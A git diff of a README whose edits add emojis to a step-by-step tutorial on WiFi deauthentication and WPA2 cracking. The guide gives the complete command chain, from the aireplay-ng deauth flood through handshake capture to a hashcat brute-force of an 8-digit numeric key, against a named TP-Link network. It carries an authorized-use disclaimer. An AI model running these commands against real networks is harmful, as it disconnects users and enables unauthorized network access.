@@ -1,29 +1,29 @@
-# WiFi Deauthentication & WPA2 Cracking using Hashcat
+# 🚨 WiFi Deauthentication & WPA2 Cracking using Hashcat
 
-> **Disclaimer:** This guide is intended strictly for educational purposes and ethical hacking within authorized environments. Do not attempt on networks without explicit permission.
+> ⚠️ **Disclaimer:** This guide is strictly for educational purposes and ethical hacking within authorized environments. Do **not** attempt on networks without explicit permission.
 
-## Requirements
+## 🧰 Requirements
 
-- Kali Linux
-- Compatible WiFi adapter (supports monitor mode & packet injection)
-- Tools used:
+- 🐧 Kali Linux
+- 📡 Compatible WiFi adapter (supports monitor mode & packet injection)
+- 🔧 Tools used:
   - `airmon-ng`
   - `airodump-ng`
   - `aireplay-ng`
   - `hcxpcapngtool`
   - `hashcat`
 
-## Step-by-Step Process
+## 🛠️ Step-by-Step Process
 
-### 1. Check WiFi Dongle Connection
+### 1️⃣ Check WiFi Dongle Connection
 
 ```bash
 iwconfig
 ```
 
-Check if your dongle (e.g., wlan1) is detected and in `Managed` mode.
+✅ Ensure your dongle (e.g., wlan1) is detected and in `Managed` mode.
 
-### 2. Enable Monitor Mode
+### 2️⃣ Enable Monitor Mode
 
 ```bash
 sudo airmon-ng check kill
@@ -31,30 +31,29 @@ sudo airmon-ng start wlan1
 iwconfig
 ```
 
-Confirm that the interface (wlan1) is now in `Monitor` mode.
+🔄 This puts your interface in `Monitor` mode. Confirm using `iwconfig`.
 
-### 3. Discover Nearby WiFi Networks
+### 3️⃣ Discover Nearby WiFi Networks
 
 ```bash
 sudo airodump-ng wlan1
 ```
 
-Find your target network and note the following:
-Like in my case it was: 
+🔍 Find your target network and note the following:
 
-- SSID: TP-Link\_2646
-- Channel: 4
-- BSSID: C0\:C9\:E3:83:26:46
+- 📶 SSID: TP-Link\_2646
+- 📺 Channel: 4
+- 🆔 BSSID: C0\:C9\:E3:83:26:46
 
-### 4. Target the Specific Network
+### 4️⃣ Target the Specific Network
 
 ```bash
 sudo airodump-ng wlan1 -d C0:C9:E3:83:26:46
 ```
 
-This filters results to show only the target network.
+🎯 Filters to show only the selected WiFi network.
 
-### 5. Deauthenticate Connected Devices
+### 5️⃣ Deauthenticate Connected Devices
 
 In a **new terminal**, run:
 
@@ -62,9 +61,9 @@ In a **new terminal**, run:
 sudo aireplay-ng --deauth 0 -a C0:C9:E3:83:26:46 wlan1
 ```
 
-This forces devices to disconnect and reconnect, capturing the handshake.
+🔨 This forces all connected devices to disconnect, prompting handshake reauthentication.
 
-### 6. Capture WPA2 Handshake
+### 6️⃣ Capture WPA2 Handshake
 
 In the original terminal:
 
@@ -72,41 +71,48 @@ In the original terminal:
 sudo airodump-ng -w hack1 -c 4 --bssid C0:C9:E3:83:26:46 wlan1
 ```
 
-- `-w hack1`: Saves to hack1-01.cap
-- `-c 4`: Channel 4
-- `--bssid`: Specific router target
+💾 Options:
 
-### 7. Convert .cap to .hc22000 Format
+- `-w hack1`: Saves to `hack1-01.cap`
+- `-c 4`: Locks to channel 4
+- `--bssid`: Targets the specific router
+
+### 7️⃣ Convert .cap to .hc22000 Format
 
 ```bash
 sudo hcxpcapngtool -o wpa2.hc22000 hack1-01.cap
 ```
 
-This converts the capture into a format readable by Hashcat.
+🔄 Converts the capture file into a format readable by Hashcat.
 
-### 8. Brute-Force the WPA2 Password
+### 8️⃣ Brute-Force the WPA2 Password
 
 ```bash
 hashcat -m 22000 -a 3 wpa2.hc22000 ?d?d?d?d?d?d?d?d
 ```
 
-- `-m 22000`: WPA2
-- `-a 3`: Brute-force mode
-- `?d?d?d?d?d?d?d?d`: 8-digit numeric password pattern
+🧠 Explanation:
 
-### 9. (Optional) Restart Network Manager
+- `-m 22000`: WPA2 handshake format
+- `-a 3`: Brute-force attack
+- `?d?d?d?d?d?d?d?d`: Pattern for 8-digit numeric password
+
+### 9️⃣ (Optional) Restart Network Manager
 
 ```bash
 sudo service NetworkManager restart
 ```
 
-To restore regular network functionality.
+🔧 Restores regular network functionality after monitor mode.
 
-## Summary
+## ✅ Summary
 
-Using this method, a default 8-digit numeric password of a TP-Link router was successfully cracked. This demonstrates a real-world vulnerability in using weak/default WiFi passwords.
+Using this method, a default 8-digit numeric password of a TP-Link router was successfully cracked. 🔓 This demonstrates the risk of weak/default WiFi passwords.
 
 ---
 
-**Educational Use Only.** Always act responsibly and ethically when handling cybersecurity tools.
+> 🧠 **Think Before You Hack** Always act responsibly and ethically when using cybersecurity tools. 🛡️
+    
+## NOTE:
+The images have been provided for better guidance.
 
